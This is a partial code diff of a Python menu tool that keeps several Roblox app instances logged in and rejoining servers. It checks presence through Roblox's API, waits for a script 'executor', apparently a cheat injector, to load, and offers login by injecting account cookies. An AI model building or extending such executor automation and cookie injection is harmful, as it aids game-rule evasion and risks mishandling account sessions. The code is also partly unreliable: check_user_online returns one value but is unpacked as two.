+                json.dump({user_id: username}, file)
+        else:
+            with open("usernames.json", "r+") as file:
+                try:
+                    data = json.load(file)
+                except json.JSONDecodeError:
+                    data = {}
+                data[user_id] = username
+                file.seek(0)
+                json.dump(data, file)
+                file.truncate()
+    except (IOError, json.JSONDecodeError) as e:
+        print(Fore.RED + f"Error saving username: {e}" + Style.RESET_ALL)
+
+# Example of loading the username from persistent storage
+def load_saved_username(user_id):
+    try:
+        with open("usernames.json", "r") as file:
+            data = json.load(file)
+            return data.get(user_id)
+    except (FileNotFoundError, json.JSONDecodeError, IOError) as e:
+        print(Fore.RED + f"Error loading username: {e}" + Style.RESET_ALL)
+        return None
+    
+def load_cache():
+    global username_cache
+    if os.path.exists(CACHE_FILE):
+        with open(CACHE_FILE, "r") as f:
+            username_cache = json.load(f)
+
+# Save the cache to file
+def save_cache():
+    try:
+        temp_file = CACHE_FILE + ".tmp"
+        with open(temp_file, "w") as f:
+            json.dump(username_cache, f)
+        os.replace(temp_file, CACHE_FILE)  # Atomic move to replace the file
+    except IOError as e:
+        print(Fore.RED + f"Error saving cache: {e}" + Style.RESET_ALL)
+        
+def check_user_online(user_id):
+    try:
+        url = "https://presence.roblox.com/v1/presence/users"
+        headers = {'Content-Type': 'application/json'}
+        body = json.dumps({"userIds": [user_id]})
+        response = requests.post(url, headers=headers, data=body)
+        response.raise_for_status()
+        
+        data = response.json()
+        presence_type = data["userPresences"][0]["userPresenceType"]
+        return presence_type
+    except Exception as e:
+        print(f"Error checking online status: {e}")
+        return None
+
+detect_and_write_lua_script()
+        
+def main():
+    clear_screen() 
+    load_cache()  
+    
+    print_rainbow_header()
+    while True:
+        clear_screen()  # Clear screen each time to avoid overlapping
+        print_rainbow_header()  # Always print the header
+
+        menu_options = [
+            "Start Auto Rejoin Roblox Game",
+            "Set User IDs For Each Package",
+            "Same Game ID Or Private Server Link",
+            "Different Private Server Or Game ID",
+            "Clear User IDs And/Or Private Server Links",
+            "List",
+            "Automatically Set Up User ID For Roblox Games",
+            "Roblox Account Login Using Cookies",            
+            "Exit"
+        ]
+
+        create_dynamic_menu(menu_options)  # Create the dynamic menu
+
+        setup_type = input(Fore.LIGHTMAGENTA_EX + "Please Enter Your Choice: " + Style.RESET_ALL)
+        
+        if setup_type == "1":
             server_links = load_server_links()
-            accounts = load_accounts() 
+            accounts = load_accounts()
 
             if not accounts:
-                print(Fore.RED + "You Have Not Set User ID, Please Check And Try Again Later!" + Style.RESET_ALL)
+                print(Fore.RED + "No user IDs set up yet! Please set them up before proceeding." + Style.RESET_ALL)
                 continue
             elif not server_links:
-                print(Fore.RED + "You Have Not Set Game ID Or Private Server Link, Please Check And Try Again Later!" + Style.RESET_ALL)
+                print(Fore.RED + "No game ID or private server link set up yet! Please set them up before proceeding." + Style.RESET_ALL)
                 continue
 
-            force_rejoin_interval = int(input(Fore.CYAN + "Please Enter Required Time To Shut Down And Restart Roblox Game(Minute): " + Style.RESET_ALL)) * 60
+            try:
+                force_rejoin_interval = int(input("Enter the force rejoin/kill Roblox interval in minutes: ")) * 60
+                if force_rejoin_interval <= 0:
+                    raise ValueError("The interval must be a positive integer.")
+            except ValueError as ve:
+                print(Fore.RED + f"Invalid input: {ve}. Please enter a valid interval in minutes." + Style.RESET_ALL)
+                input(Fore.GREEN + "Press Enter to return to the menu..." + Style.RESET_ALL)
+                continue
 
-            print(Fore.YELLOW + "In Progress Turning Off All Roblox Games On Your Device..." + Style.RESET_ALL)
+            package_statuses = {}
+            for package_name, server_link in server_links:
+                package_statuses[package_name] = {
+                    "Status": Fore.LIGHTCYAN_EX + "Initializing" + Style.RESET_ALL,
+                    "Username": get_username(accounts[server_links.index((package_name, server_link))][1]),
+                }
+
+            update_status_table(package_statuses)
+
+            # Kill Roblox processes and wait for 5 seconds
             kill_roblox_processes()
-            print(Fore.YELLOW + "Please Wait 5 Seconds To Restart Roblox Game..." + Style.RESET_ALL)
             time.sleep(5)
 
-            num_packages = len(server_links)  
+            num_packages = len(server_links)
 
             for package_name, server_link in server_links:
-                launch_roblox(package_name, server_link, num_packages)
+                try:
+                    package_statuses[package_name]["Status"] = Fore.LIGHTCYAN_EX + "Launching" + Style.RESET_ALL
+                    update_status_table(package_statuses)
+                    launch_roblox(package_name, server_link, num_packages, package_statuses)
+                    package_statuses[package_name]["Status"] = Fore.GREEN + "Joined" + Style.RESET_ALL
+
+                    # Get the username for the executor check
+                    username = get_username(accounts[server_links.index((package_name, server_link))][1])
+
+                    # Reset the executor file before checking
+                    reset_executor_file(username)
+
+                    # Ensure the tool waits for the executor to load before proceeding to the next package
+                    while True:
+                        if check_executor_status(username, continuous=False):
+                            package_statuses[package_name]["Status"] = Fore.GREEN + f"Executor loaded successfully for {username}" + Style.RESET_ALL
+                            update_status_table(package_statuses)
+                            break  # Break the loop and proceed to the next package
+
+                        # If the executor failed to load within 2 minutes, rejoin and retry
+                        else:
+                            print(f"Executor did not load for {package_name} (username: {username}). Rejoining...")
+                            package_statuses[package_name]["Status"] = Fore.RED + "Executor failed, rejoining..." + Style.RESET_ALL
+                            update_status_table(package_statuses)
+                            kill_roblox_process(package_name)
+                            time.sleep(2)
+                            launch_roblox(package_name, server_link, num_packages, package_statuses)
+
+                except Exception as e:
+                    # Handle subprocess or launch error
+                    print(Fore.RED + f"Error launching Roblox for {package_name}: {e}" + Style.RESET_ALL)
+                    package_statuses[package_name]["Status"] = Fore.RED + "Launch failed" + Style.RESET_ALL
+                update_status_table(package_statuses)
 
             start_time = time.time()
 
             while True:
-                for package_name, user_id in accounts:
-                    if not user_id.isdigit():
-                        print(f"Retrieving user ID for username: {user_id}...")
-                        user_id = asyncio.run(get_user_id(user_id))
-                        if user_id is None:
-                            print(Fore.RED + "User ID Unable To Find, Please Enter Manually!" + Style.RESET_ALL)
-                            user_id = input(Fore.CYAN + "Please Enter Your User ID: " + Style.RESET_ALL)
+                current_time = time.time()
 
-                    username = get_username(user_id) or user_id
+                try:
+                    for package_name, user_id in accounts:
+                        try:
+                            # Retrieve the correct server_link for the package_name
+                            server_link = get_server_link(package_name, server_links)
+                            if not server_link:
+                                package_statuses[package_name]["Status"] = Fore.RED + "Server link not found" + Style.RESET_ALL
+                                update_status_table(package_statuses)
+                                continue
 
-                    presence_type = check_user_online(user_id)
+                            # Get the username associated with the user ID or fallback to user ID
+                            username = get_username_from_id(user_id)
+                            presence_type, last_location_current = check_user_online(user_id)
 
-                    if presence_type == 2: 
-                        print(Fore.GREEN + f"{username} ({user_id}) is currently in-game." + Style.RESET_ALL)
-                    else:
-                        print(Fore.RED + f"{username} ({user_id}) is offline or in another status. Checking again..." + Style.RESET_ALL)
-                        
-                        max_retries = 5
-                        retry_interval = 3  
-                        for attempt in range(max_retries):
-                            presence_type = check_user_online(user_id)
-                            if presence_type == 2:  
-                                print(Fore.GREEN + f"{username} ({user_id}) is currently in-game." + Style.RESET_ALL)
-                                break
+                            package_statuses[package_name]["Username"] = username
+
+                            if presence_type == 2:
+                                package_statuses[package_name]["Status"] = Fore.GREEN + "In-Game" + Style.RESET_ALL
+                                
+                                if not check_executor_status(username, continuous=False):  # If executor isn't detected as working
+                                    print(f"Executor did not update for {package_name} (username: {username}). Rejoining...")
+                                    package_statuses[package_name]["Status"] = Fore.RED + "Executor failed, rejoining..." + Style.RESET_ALL
+                                    update_status_table(package_statuses)
+                                    kill_roblox_process(package_name)
+                                    time.sleep(2)
+                                    launch_roblox(package_name, server_link, num_packages, package_statuses)
+                                    
                             else:
-                                print(Fore.YELLOW + f"Attempt {attempt + 1}/{max_retries}: {username} ({user_id}) is still offline. Retrying in {retry_interval} seconds..." + Style.RESET_ALL)
-                                time.sleep(retry_interval) 
+                                if not is_roblox_running(package_name):
+                                    package_statuses[package_name]["Status"] = Fore.RED + "Process Crashed, Relaunching" + Style.RESET_ALL
+                                    kill_roblox_process(package_name)
+                                    time.sleep(2)
+                                    launch_roblox(package_name, server_link, num_packages, package_statuses)
+                                    
+                                    # Check executor status after relaunch
+                                    if not check_executor_status(username, continuous=False):
+                                        print(f"Executor did not load for {package_name} (username: {username}) after relaunch. Rejoining...")
+                                        package_statuses[package_name]["Status"] = Fore.RED + "Executor failed, rejoining..." + Style.RESET_ALL
+                                        kill_roblox_process(package_name)
+                                        time.sleep(2)
+                                        launch_roblox(package_name, server_link, num_packages, package_statuses)
+                                    
+                                else:
+                                    if last_location_current == "Website":
+                                        package_statuses[package_name]["Status"] = Fore.RED + "On Website, Rejoining" + Style.RESET_ALL
+                                        kill_roblox_process(package_name)
+                                        time.sleep(2)
+                                        launch_roblox(package_name, server_link, num_packages, package_statuses)
 
-                        if presence_type != 2:  # If the user was offline in all checks
-                            print(Fore.RED + f"{username} ({user_id}) is offline. Rejoining..." + Style.RESET_ALL)
-                            kill_roblox_process(package_name)
-                            launch_roblox(package_name, server_link, num_packages)
+                                        # Check executor status after relaunch
+                                        if not check_executor_status(username, continuous=False):
+                                            print(f"Executor did not load for {package_name} (username: {username}) after relaunch. Rejoining...")
+                                            package_statuses[package_name]["Status"] = Fore.RED + "Executor failed, rejoining..." + Style.RESET_ALL
+                                            update_status_table(package_statuses)
+                                            kill_roblox_process(package_name)
+                                            time.sleep(2)
+                                            launch_roblox(package_name, server_link, num_packages, package_statuses)
 
-                    time.sleep(5) 
+                                        # If executor loaded successfully after relaunch
+                                        else:
+                                            package_statuses[package_name]["Status"] = Fore.GREEN + "Executor loaded successfully after rejoin" + Style.RESET_ALL
+                                            update_status_table(package_statuses)
+                                    else:
+                                        package_statuses[package_name]["Status"] = Fore.YELLOW + "Not In-Game, Recently Active" + Style.RESET_ALL
 
-                time.sleep(60)  
-                
-                if time.time() - start_time >= force_rejoin_interval:
-                    print("Force killing Roblox processes due to time limit.")
-                    kill_roblox_processes()
-                    start_time = time.time()  # Reset start time
-                    print(Fore.YELLOW + "Please Wait 5 Seconds To Restart Roblox Game..." + Style.RESET_ALL)
-                    time.sleep(5)
-                    # Rejoin all servers after killing the processes
-                    for package_name, server_link in server_links:
-                        launch_roblox(package_name, server_link, num_packages) 
+                            update_status_table(package_statuses)
+                            time.sleep(25)  # Adjust the delay time as needed
 
+                        except Exception as e:
+                            print(Fore.RED + f"Error during rejoin process for {package_name}: {e}" + Style.RESET_ALL)
+                            package_statuses[package_name]["Status"] = Fore.RED + "General error" + Style.RESET_ALL
+                            update_status_table(package_statuses)
+
+                    if current_time - start_time >= force_rejoin_interval:
+                        print("Force killing Roblox processes due to time limit.")
+                        kill_roblox_processes()
+                        start_time = current_time
+                        print(Fore.YELLOW + "Waiting for 5 seconds before starting the rejoin process..." + Style.RESET_ALL)
+                        time.sleep(5)
+                        for package_name, server_link in server_links:
+                            try:
+                                package_statuses[package_name]["Status"] = Fore.RED + "Rejoining" + Style.RESET_ALL
+                                update_status_table(package_statuses)
+                                launch_roblox(package_name, server_link, num_packages, package_statuses)
+                                
+                                # Check executor status after relaunch
+                                if not check_executor_status(username, continuous=False):
+                                    print(f"Executor did not load for {package_name} (username: {username}) after rejoin. Rejoining...")
+                                    package_statuses[package_name]["Status"] = Fore.RED + "Executor failed, rejoining..." + Style.RESET_ALL
+                                    kill_roblox_process(package_name)
+                                    time.sleep(2)
+                                    launch_roblox(package_name, server_link, num_packages, package_statuses)
+
+                                package_statuses[package_name]["Status"] = Fore.GREEN + "Joined" + Style.RESET_ALL
+                            except Exception as e:
+                                print(Fore.RED + f"Error rejoining Roblox for {package_name}: {e}" + Style.RESET_ALL)
+
+                        update_status_table(package_statuses)
+
+                    time.sleep(90)
+
+                except Exception as e:
+                    print(Fore.RED + f"Critical error in auto rejoin loop: {e}" + Style.RESET_ALL)
+                    time.sleep(60)
+                    continue
+            
         elif setup_type == "2":
             accounts = []
             packages = get_roblox_packages()
@@ -479,8 +1064,11 @@ def main():
                 print(f"Set {package_name} to user ID: {user_id}")
 
             save_accounts(accounts)
+            save_cache()
             print(Fore.GREEN + "User IDs saved!" + Style.RESET_ALL)
 
+            input(Fore.GREEN + "\nPress Enter to exit..." + Style.RESET_ALL) 
+            
         elif setup_type == "3":
             server_link = input(Fore.CYAN + "Please Enter Game ID Or Private Server Link: " + Style.RESET_ALL)
             formatted_link = format_server_link(server_link)
@@ -489,44 +1077,68 @@ def main():
                 packages = get_roblox_packages()
                 server_links = [(package_name, formatted_link) for package_name in packages]
                 save_server_links(server_links)
-                print(Fore.GREEN + "Game ID And Private Server Link Saved Successfully." + Style.RESET_ALL)
+                print(Fore.GREEN + "Game ID or private server link saved successfully!" + Style.RESET_ALL)
+                
+            input(Fore.GREEN + "\nPress Enter to exit..." + Style.RESET_ALL)                 
 
         elif setup_type == "4":
             packages = get_roblox_packages()
             server_links = []
 
             for package_name in packages:
-                server_link = input(Fore.CYAN + f"Please Enter Game ID Or Private Server Link For: {package_name}: " + Style.RESET_ALL)
+                server_link = input(f"Enter the game ID or private server link for {package_name}: ")
                 formatted_link = format_server_link(server_link)
 
                 if formatted_link:
                     server_links.append((package_name, formatted_link))
 
             save_server_links(server_links)  
-
+            
+            input(Fore.GREEN + "\nPress Enter to exit..." + Style.RESET_ALL) 
+            
         elif setup_type == "5":
-            clear_choice = input(Fore.GREEN + "Do You Really Want To Delete?\n1. Delete All User IDs\n2. Delete All Private Server Links\n3. Delete Both\nEnter Your Choice: " + Style.RESET_ALL)
+            clear_choice = input(Fore.GREEN + "What do you want to clear?\n1. Clear User IDs\n2. Clear Server Links\n3. Clear Both\nEnter choice: " + Style.RESET_ALL)
 
             if clear_choice == "1":
-                os.remove(ACCOUNTS_FILE)
-                print(Fore.GREEN + "Successfully Deleted All User IDs From Your Device." + Style.RESET_ALL)
-            elif clear_choice == "2":
-                os.remove(SERVER_LINKS_FILE)
-                print(Fore.GREEN + "Successfully Deleted All Private Server Links From Your Device." + Style.RESET_ALL)
-            elif clear_choice == "3":
-                os.remove(ACCOUNTS_FILE)
-                os.remove(SERVER_LINKS_FILE)
-                print(Fore.GREEN + "Successfully Deleted All User IDs And Private Server Links From Your Device." + Style.RESET_ALL) 
+                if os.path.exists(ACCOUNTS_FILE):
+                    os.remove(ACCOUNTS_FILE)
+                    print(Fore.GREEN + "User IDs cleared successfully!" + Style.RESET_ALL)
+                else:
+                    print(Fore.YELLOW + f"No such file: '{ACCOUNTS_FILE}' found to clear." + Style.RESET_ALL)
 
+            elif clear_choice == "2":
+                if os.path.exists(SERVER_LINKS_FILE):
+                    os.remove(SERVER_LINKS_FILE)
+                    print(Fore.GREEN + "Server links cleared successfully!" + Style.RESET_ALL)
+                else:
+                    print(Fore.YELLOW + f"No such file: '{SERVER_LINKS_FILE}' found to clear." + Style.RESET_ALL)
+
+            elif clear_choice == "3":
+                if os.path.exists(ACCOUNTS_FILE):
+                    os.remove(ACCOUNTS_FILE)
+                    print(Fore.GREEN + "User IDs cleared successfully!" + Style.RESET_ALL)
+                else:
+                    print(Fore.YELLOW + f"No such file: '{ACCOUNTS_FILE}' found to clear." + Style.RESET_ALL)
+
+                if os.path.exists(SERVER_LINKS_FILE):
+                    os.remove(SERVER_LINKS_FILE)
+                    print(Fore.GREEN + "Server links cleared successfully!" + Style.RESET_ALL)
+                else:
+                    print(Fore.YELLOW + f"No such file: '{SERVER_LINKS_FILE}' found to clear." + Style.RESET_ALL)
+                    
+            input(Fore.GREEN + "\nPress Enter to exit..." + Style.RESET_ALL) 
+            
         elif setup_type == "6":
             accounts = load_accounts()
             server_links = load_server_links()
 
-            print(Fore.CYAN + "Usernames, User IDs, Package Names, and Server Links:" + Style.RESET_ALL)
-            for (package_name, user_id), (_, server_link) in zip(accounts, server_links):
-                username = get_username(user_id) or user_id
-                print(f"Package Name: {package_name}, Username: {username}, User ID: {user_id}, Server Link: {server_link}")
-
+            if accounts and server_links:
+                headers = ["Account", "Server", "Game ID", "Username"]
+                rows = [(package, server, game_id, get_username(game_id)) for (package, game_id), (_, server) in zip(accounts, server_links)]
+                create_dynamic_table(headers, rows)
+            else:
+                print(Fore.RED + "No accounts or server links to display." + Style.RESET_ALL)
+            input(Fore.GREEN + "\nPress Enter to return to the menu..." + Style.RESET_ALL) 
         elif setup_type == "7":
             print(Fore.GREEN + "Auto Setup User IDs from each package's appStorage.json..." + Style.RESET_ALL)
             packages = get_roblox_packages()
@@ -543,6 +1155,7 @@ def main():
                     print(Fore.RED + f"UserId not found for {package_name}. Make sure the file path is correct and the format is as expected." + Style.RESET_ALL)
 
             save_accounts(accounts)
+            save_cache()
             print(Fore.GREEN + "User IDs saved from appStorage.json!" + Style.RESET_ALL)
 
             # Prompt for server link
@@ -553,16 +1166,16 @@ def main():
                 server_links = [(package_name, formatted_link) for package_name in packages]
                 save_server_links(server_links)
                 print(Fore.GREEN + "Game ID or private server link saved successfully!" + Style.RESET_ALL)
+            input(Fore.GREEN + "\nPress Enter to exit..." + Style.RESET_ALL) 
 
-
-        elif setup_type == "8":
+        elif setup_type == "8":  # Auto Login via Cookie
             inject_cookies_and_appstorage()
-            input(Fore.GREEN + "\nPress Enter To Exit..." + Style.RESET_ALL) 
+            input(Fore.GREEN + "\nPress Enter to exit..." + Style.RESET_ALL) 
 
         elif setup_type == "9":
-            global stop_webhook_thread
-            stop_webhook_thread = True 
             break 
 
 if __name__ == "__main__":
-    main() 
+    load_cache()  # Load the cache at the start
+    main()  # Run the main function
+    save_cache()  # Save the cache before exiting
